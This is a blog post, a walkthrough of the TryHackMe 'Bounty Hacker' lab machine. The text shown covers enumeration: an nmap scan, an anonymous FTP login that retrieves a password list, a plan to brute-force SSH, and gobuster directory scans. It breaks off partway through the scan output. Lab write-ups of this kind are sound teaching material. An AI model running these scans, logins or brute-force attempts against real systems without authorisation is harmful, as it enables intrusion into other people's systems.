<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Bounty Hacker - THM Walkthrough :: Umar_0x01 – Pentester | Programmer | Your average sakurity guy ( ͡~ ͜ʖ ͡°)</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Enumeration  Host: 10.10.56.222
 Let&amp;rsquo;s start with nmap scan against the host and see the ports open on it.
┌──(root💀b0x)-[/mnt/hgfs/THM/Bounty Hacker] [1/377] └─# nmap -A 10.10.56.222 -Pn -n  Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 00:03 PKT Nmap scan report for 10.10.56.222 Host is up (0.21s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://umar0x01.sh/post/bounty-hacker-thm/" />





<link rel="stylesheet" href="https://umar0x01.sh/assets/style.css">

<link rel="stylesheet" href="https://umar0x01.sh/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://umar0x01.sh/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="https://umar0x01.sh/img/favicon.png">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Bounty Hacker - THM Walkthrough"/>
<meta name="twitter:description" content="Walkthrough of the machine Bounty Hacker on TryHackMe - https://tryhackme.com/room/cowboyhacker"/>



<meta property="og:title" content="Bounty Hacker - THM Walkthrough" />
<meta property="og:description" content="Walkthrough of the machine Bounty Hacker on TryHackMe - https://tryhackme.com/room/cowboyhacker" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://umar0x01.sh/post/bounty-hacker-thm/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-04-08T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-04-08T00:00:00&#43;00:00" />








<link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/img/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/img/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">




  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">$ cd /home/umar_0x01/</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/anime">Anime</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
        
          <li><a href="https://pentestlabs.gitbook.io">PentestLabs</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/anime">Anime</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
      
        <li><a href="https://pentestlabs.gitbook.io">PentestLabs</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title"><a href="https://umar0x01.sh/post/bounty-hacker-thm/">Bounty Hacker - THM Walkthrough</a></h1>
    <div class="post-meta">
      
        <span class="post-date">
          2021-04-08
        </span>

        
          
        
      

      <span class="post-author">— Written by Umar_0x01</span>
      
    </div>

    

    
      <figure class="post-cover">
        
          <img src="https://umar0x01.sh/img/bounty_hacker-thm/Untitled%202.png" alt="Bounty Hacker - THM Walkthrough" />
        

        
      </figure>
    

    <div class="post-content">
      
      <h2 id="enumeration">Enumeration</h2>
<hr>
<p><strong>Host:</strong> 10.10.56.222</p>
<hr>
<p>Let&rsquo;s start with nmap scan against the host and see the ports open on it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]                                                                                                                                                                [<span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">377</span>]
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># nmap -A 10.10.56.222 -Pn -n                                                                           </span>
Host discovery disabled (<span style="color:#f92672">-</span>Pn)<span style="color:#f92672">.</span> All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> <span style="color:#f92672">and</span> scan times will be slower<span style="color:#f92672">.</span>
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org ) at <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">03</span> PKT
Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>
Host <span style="color:#f92672">is</span> up (<span style="color:#ae81ff">0.21</span>s latency)<span style="color:#f92672">.</span>
Not shown: <span style="color:#ae81ff">967</span> filtered ports, <span style="color:#ae81ff">30</span> closed ports
PORT   STATE SERVICE VERSION
<span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp open  ftp     vsftpd <span style="color:#ae81ff">3.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">3</span>
<span style="color:#f92672">|</span> ftp<span style="color:#f92672">-</span>anon: Anonymous FTP login allowed (FTP code <span style="color:#ae81ff">230</span>)
<span style="color:#f92672">|</span> <span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>r<span style="color:#f92672">--</span>    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">418</span> Jun <span style="color:#ae81ff">07</span>  <span style="color:#ae81ff">2020</span> locks<span style="color:#f92672">.</span>txt
<span style="color:#f92672">|</span>_<span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>r<span style="color:#f92672">--</span>    <span style="color:#ae81ff">1</span> ftp      ftp            <span style="color:#ae81ff">68</span> Jun <span style="color:#ae81ff">07</span>  <span style="color:#ae81ff">2020</span> task<span style="color:#f92672">.</span>txt
<span style="color:#f92672">|</span> ftp<span style="color:#f92672">-</span>syst: 
<span style="color:#f92672">|</span>   STAT: 
<span style="color:#f92672">|</span> FTP server status:
<span style="color:#f92672">|</span>      Connected to ::ffff:<span style="color:#ae81ff">10.17</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.120</span>
<span style="color:#f92672">|</span>      Logged <span style="color:#f92672">in</span> <span style="color:#66d9ef">as</span> ftp
<span style="color:#f92672">|</span>      TYPE: ASCII
<span style="color:#f92672">|</span>      No session bandwidth limit
<span style="color:#f92672">|</span>      Session timeout <span style="color:#f92672">in</span> seconds <span style="color:#f92672">is</span> <span style="color:#ae81ff">300</span>
<span style="color:#f92672">|</span>      Control connection <span style="color:#f92672">is</span> plain text
<span style="color:#f92672">|</span>      Data connections will be plain text
<span style="color:#f92672">|</span>      At session startup, client count was <span style="color:#ae81ff">1</span>
<span style="color:#f92672">|</span>      vsFTPd <span style="color:#ae81ff">3.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">-</span> secure, fast, stable
<span style="color:#f92672">|</span>_End of status
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp open  ssh     OpenSSH <span style="color:#ae81ff">7.2</span>p2 Ubuntu <span style="color:#ae81ff">4</span>ubuntu2<span style="color:#f92672">.</span><span style="color:#ae81ff">8</span> (Ubuntu Linux; protocol <span style="color:#ae81ff">2.0</span>)
<span style="color:#f92672">|</span> ssh<span style="color:#f92672">-</span>hostkey: 
<span style="color:#f92672">|</span>   <span style="color:#ae81ff">2048</span> dc:f8:df:a7:a6:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">6</span>d:<span style="color:#ae81ff">18</span>:b0:<span style="color:#ae81ff">70</span>:<span style="color:#ae81ff">2</span>b:a5:aa:a6:<span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">3</span>e (RSA)
<span style="color:#f92672">|</span>   <span style="color:#ae81ff">256</span> ec:c0:f2:d9:<span style="color:#ae81ff">1</span>e:<span style="color:#ae81ff">6</span>f:<span style="color:#ae81ff">48</span>:<span style="color:#ae81ff">7</span>d:<span style="color:#ae81ff">38</span>:<span style="color:#ae81ff">9</span>a:e3:bb:<span style="color:#ae81ff">08</span>:c4:<span style="color:#ae81ff">0</span>c:c9 (ECDSA)
<span style="color:#f92672">|</span>_  <span style="color:#ae81ff">256</span> a4:<span style="color:#ae81ff">1</span>a:<span style="color:#ae81ff">15</span>:a5:d4:b1:cf:<span style="color:#ae81ff">8</span>f:<span style="color:#ae81ff">16</span>:<span style="color:#ae81ff">50</span>:<span style="color:#ae81ff">3</span>a:<span style="color:#ae81ff">7</span>d:d0:d8:<span style="color:#ae81ff">13</span>:c2 (ED25519)
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp open  http    Apache httpd <span style="color:#ae81ff">2.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">18</span> ((Ubuntu))
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">18</span> (Ubuntu)
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).</span>
Aggressive OS guesses: HP P2000 G3 NAS device (<span style="color:#ae81ff">91</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">2.6</span><span style="color:#f92672">.</span><span style="color:#ae81ff">32</span> (<span style="color:#ae81ff">89</span><span style="color:#f92672">%</span>), Infomir MAG<span style="color:#f92672">-</span><span style="color:#ae81ff">250</span> set<span style="color:#f92672">-</span>top box (<span style="color:#ae81ff">89</span><span style="color:#f92672">%</span>), Ubiquiti AirMax NanoStation WAP (Linux <span style="color:#ae81ff">2.6</span><span style="color:#f92672">.</span><span style="color:#ae81ff">32</span>) (<span style="color:#ae81ff">89</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">3.7</span> (<span style="color:#ae81ff">89</span><span style="color:#f92672">%</span>), Netgear RAIDiator <span style="color:#ae81ff">4.2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">21</span> (Linux 
<span style="color:#ae81ff">2.6</span><span style="color:#f92672">.</span><span style="color:#ae81ff">37</span>) (<span style="color:#ae81ff">89</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">2.6</span><span style="color:#f92672">.</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">3.13</span> (<span style="color:#ae81ff">89</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">3.0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">3.2</span> (<span style="color:#ae81ff">89</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">3.3</span> (<span style="color:#ae81ff">89</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">2.6</span><span style="color:#f92672">.</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">3.1</span> (<span style="color:#ae81ff">88</span><span style="color:#f92672">%</span>)
No exact OS matches <span style="color:#66d9ef">for</span> host (test conditions non<span style="color:#f92672">-</span>ideal)<span style="color:#f92672">.</span>
Network Distance: <span style="color:#ae81ff">5</span> hops
Service Info: OSs: Unix, Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel

TRACEROUTE (using port <span style="color:#ae81ff">41511</span><span style="color:#f92672">/</span>tcp)
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">63.06</span> ms  <span style="color:#ae81ff">10.17</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span>
<span style="color:#ae81ff">2</span>   <span style="color:#f92672">...</span> <span style="color:#ae81ff">4</span>
<span style="color:#ae81ff">5</span>   <span style="color:#ae81ff">238.98</span> ms <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>

OS <span style="color:#f92672">and</span> Service detection performed<span style="color:#f92672">.</span> Please report any incorrect results at https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>submit<span style="color:#f92672">/</span> <span style="color:#f92672">.</span>
Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned <span style="color:#f92672">in</span> <span style="color:#ae81ff">38.33</span> seconds
</code></pre></div><p>Alright, we can see three ports open. Let&rsquo;s enumerate the FTP (21) port first.</p>
<h3 id="ftp---port-21">FTP - Port (21)</h3>
<p>No exploits found for the version reported. Let&rsquo;s try anonymous login against the FTP port open.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># ftp 10.10.56.222 21  </span>
Connected to <span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">.</span>
<span style="color:#ae81ff">220</span> (vsFTPd <span style="color:#ae81ff">3.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">3</span>)
Name (<span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>:root): anonymous
<span style="color:#ae81ff">230</span> Login successful<span style="color:#f92672">.</span>
Remote system type <span style="color:#f92672">is</span> UNIX<span style="color:#f92672">.</span>
Using binary mode to transfer files<span style="color:#f92672">.</span>
ftp<span style="color:#f92672">&gt;</span> dir
<span style="color:#ae81ff">200</span> PORT command successful<span style="color:#f92672">.</span> Consider using PASV<span style="color:#f92672">.</span>
<span style="color:#ae81ff">150</span> Here comes the directory listing<span style="color:#f92672">.</span>
<span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>r<span style="color:#f92672">--</span>    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">418</span> Jun <span style="color:#ae81ff">07</span>  <span style="color:#ae81ff">2020</span> locks<span style="color:#f92672">.</span>txt
<span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span>r<span style="color:#f92672">--</span>    <span style="color:#ae81ff">1</span> ftp      ftp            <span style="color:#ae81ff">68</span> Jun <span style="color:#ae81ff">07</span>  <span style="color:#ae81ff">2020</span> task<span style="color:#f92672">.</span>txt
<span style="color:#ae81ff">226</span> Directory send OK<span style="color:#f92672">.</span>
ftp<span style="color:#f92672">&gt;</span> get locks<span style="color:#f92672">.</span>txt
local: locks<span style="color:#f92672">.</span>txt remote: locks<span style="color:#f92672">.</span>txt
<span style="color:#ae81ff">200</span> PORT command successful<span style="color:#f92672">.</span> Consider using PASV<span style="color:#f92672">.</span>
<span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> locks<span style="color:#f92672">.</span>txt (<span style="color:#ae81ff">418</span> bytes)<span style="color:#f92672">.</span>
<span style="color:#ae81ff">226</span> Transfer complete<span style="color:#f92672">.</span>
<span style="color:#ae81ff">418</span> bytes received <span style="color:#f92672">in</span> <span style="color:#ae81ff">0.08</span> secs (<span style="color:#ae81ff">5.2431</span> kB<span style="color:#f92672">/</span>s)
ftp<span style="color:#f92672">&gt;</span> get task<span style="color:#f92672">.</span>txt
local: task<span style="color:#f92672">.</span>txt remote: task<span style="color:#f92672">.</span>txt
<span style="color:#ae81ff">200</span> PORT command successful<span style="color:#f92672">.</span> Consider using PASV<span style="color:#f92672">.</span>
<span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> task<span style="color:#f92672">.</span>txt (<span style="color:#ae81ff">68</span> bytes)<span style="color:#f92672">.</span>
<span style="color:#ae81ff">226</span> Transfer complete<span style="color:#f92672">.</span>
<span style="color:#ae81ff">68</span> bytes received <span style="color:#f92672">in</span> <span style="color:#ae81ff">0.08</span> secs (<span style="color:#ae81ff">0.8768</span> kB<span style="color:#f92672">/</span>s)
ftp<span style="color:#f92672">&gt;</span>
</code></pre></div><p>Alright, <strong>anonymous login</strong> enabled on <strong>FTP</strong>. Downloaded two files present on it as well.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># cat locks.txt      </span>
rEddrAGON
ReDdr4g0nSynd<span style="color:#960050;background-color:#1e0010">!</span>cat3
Dr<span style="color:#a6e22e">@gOn</span><span style="color:#960050;background-color:#1e0010">$</span>yn9icat3
R3DDr46ONSYndIC<span style="color:#a6e22e">@Te</span>
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c<span style="color:#a6e22e">@T3</span>
Synd1c4teDr<span style="color:#a6e22e">@g0n</span>
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN<span style="color:#960050;background-color:#1e0010">$</span>yndIC<span style="color:#a6e22e">@t3</span>
<span style="color:#ae81ff">4L</span><span style="color:#ae81ff">1</span>mi6H71StHeB357
rEDdragOn<span style="color:#960050;background-color:#1e0010">$</span>ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n<span style="color:#960050;background-color:#1e0010">$</span>ynd1cate
Dr<span style="color:#a6e22e">@gOn</span><span style="color:#960050;background-color:#1e0010">$</span>yND1C4Te
RedDr<span style="color:#a6e22e">@gonSyn9ic47e</span>
REd<span style="color:#960050;background-color:#1e0010">$</span>yNdIc47e
dr<span style="color:#a6e22e">@goN5YNd1c@73</span>
rEDdrAGOnSyNDiCat3
r3ddr<span style="color:#a6e22e">@g0N</span>
ReDSynd1ca7e
                                                                                                                                                                                                                   
<span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># cat task.txt       </span>
<span style="color:#ae81ff">1.</span>) Protect Vicious<span style="color:#f92672">.</span>
<span style="color:#ae81ff">2.</span>) Plan <span style="color:#66d9ef">for</span> Red Eye pickup on the moon<span style="color:#f92672">.</span>

<span style="color:#f92672">-</span>lin
</code></pre></div><p>The first file includes passwords and the second some instructions? — Let&rsquo;s pause this for now and move onto HTTP.</p>
<hr>
<h3 id="http---port-80">HTTP - Port (80)</h3>
<p>The site has many usernames in it, maybe we can use cewl to get all the usernames? and use the passwords above to bruteforcing SSH?</p>
<p><img src="/img/bounty_hacker-thm/Untitled.png" alt=""></p>
<p>Let&rsquo;s bruteforce later. First, enumerate the local directories on the webserver using <strong>gobuster</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]                                                             
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># gobuster dir -u http://10.10.56.222 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404 -t 100       </span>
<span style="color:#f92672">===============================================================</span>   
Gobuster v3<span style="color:#f92672">.</span><span style="color:#ae81ff">1.0</span>                                                                                          
by OJ Reeves (<span style="color:#a6e22e">@TheColonial</span>) <span style="color:#f92672">&amp;</span> Christian Mehlmauer (<span style="color:#a6e22e">@firefart</span>)                                            
<span style="color:#f92672">===============================================================</span>                                                                                                                                                    
[<span style="color:#f92672">+</span>] Url:                     http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>                                                         
[<span style="color:#f92672">+</span>] Method:                  GET                                                                                                                                                                                   
[<span style="color:#f92672">+</span>] Threads:                 <span style="color:#ae81ff">100</span>                                                                         
[<span style="color:#f92672">+</span>] Wordlist:                <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>dirb<span style="color:#f92672">/</span>common<span style="color:#f92672">.</span>txt                                        
[<span style="color:#f92672">+</span>] Negative Status codes:   <span style="color:#ae81ff">404</span>                                                                                                                                                                                   
[<span style="color:#f92672">+</span>] User Agent:              gobuster<span style="color:#f92672">/</span><span style="color:#ae81ff">3.1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>                                                              
[<span style="color:#f92672">+</span>] Expanded:                true                                                                        
[<span style="color:#f92672">+</span>] Timeout:                 <span style="color:#ae81ff">10</span>s                                                                         
<span style="color:#f92672">===============================================================</span>                                      
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">08</span> <span style="color:#ae81ff">23</span>:<span style="color:#ae81ff">59</span>:<span style="color:#ae81ff">34</span> Starting gobuster <span style="color:#f92672">in</span> directory enumeration mode
<span style="color:#f92672">===============================================================</span>                                          
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/.</span>htaccess            (Status: <span style="color:#ae81ff">403</span>) [Size: <span style="color:#ae81ff">277</span>]                                       
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/.</span>hta                 (Status: <span style="color:#ae81ff">403</span>) [Size: <span style="color:#ae81ff">277</span>]                                       
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/.</span>htpasswd            (Status: <span style="color:#ae81ff">403</span>) [Size: <span style="color:#ae81ff">277</span>]
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/</span>images               (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">313</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/</span>images<span style="color:#f92672">/</span>]     
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>html           (Status: <span style="color:#ae81ff">200</span>) [Size: <span style="color:#ae81ff">969</span>]                                       
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/</span>server<span style="color:#f92672">-</span>status        (Status: <span style="color:#ae81ff">403</span>) [Size: <span style="color:#ae81ff">277</span>]                                                                                                                                                 
                                                                                                         
<span style="color:#f92672">===============================================================</span>                                          
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">08</span> <span style="color:#ae81ff">23</span>:<span style="color:#ae81ff">59</span>:<span style="color:#ae81ff">55</span> Finished                                                                             
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>Nothing interesting with <strong>common.txt</strong> wordlist and no extensions. Let&rsquo;s try with extensions maybe?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Bounty Hacker]
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># gobuster dir -u http://10.10.56.222 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404,403 -t 100 -x php,jsp,rb,py,js,asp,aspx,zip,sql,tar,txt,key,doc,docx,html,jar,groovy,back,xml,ini,inc,config,json,yml,conf,cgi</span>
<span style="color:#f92672">===============================================================</span>
Gobuster v3<span style="color:#f92672">.</span><span style="color:#ae81ff">1.0</span>
by OJ Reeves (<span style="color:#a6e22e">@TheColonial</span>) <span style="color:#f92672">&amp;</span> Christian Mehlmauer (<span style="color:#a6e22e">@firefart</span>)
<span style="color:#f92672">===============================================================</span>
[<span style="color:#f92672">+</span>] Url:                     http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span>
[<span style="color:#f92672">+</span>] Method:                  GET
[<span style="color:#f92672">+</span>] Threads:                 <span style="color:#ae81ff">100</span>
[<span style="color:#f92672">+</span>] Wordlist:                <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>dirb<span style="color:#f92672">/</span>common<span style="color:#f92672">.</span>txt
[<span style="color:#f92672">+</span>] Negative Status codes:   <span style="color:#ae81ff">403</span>,<span style="color:#ae81ff">404</span>
[<span style="color:#f92672">+</span>] User Agent:              gobuster<span style="color:#f92672">/</span><span style="color:#ae81ff">3.1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
[<span style="color:#f92672">+</span>] Extensions:              js,zip,key,doc,docx,xml,cgi,jsp,py,jar,sql,groovy,inc,config,php,rb,asp,aspx,tar,txt,html,back,ini,json,yml,conf
[<span style="color:#f92672">+</span>] Expanded:                true
[<span style="color:#f92672">+</span>] Timeout:                 <span style="color:#ae81ff">10</span>s
<span style="color:#f92672">===============================================================</span>
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">20</span> Starting gobuster <span style="color:#f92672">in</span> directory enumeration mode
<span style="color:#f92672">===============================================================</span>
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/</span>images               (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">313</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/</span>images<span style="color:#f92672">/</span>]
http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.222</span><span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>html           (Status: <span style="color:#ae81ff">200</span>) [Size: <span style="color:#ae81ff">969</span>]                                  
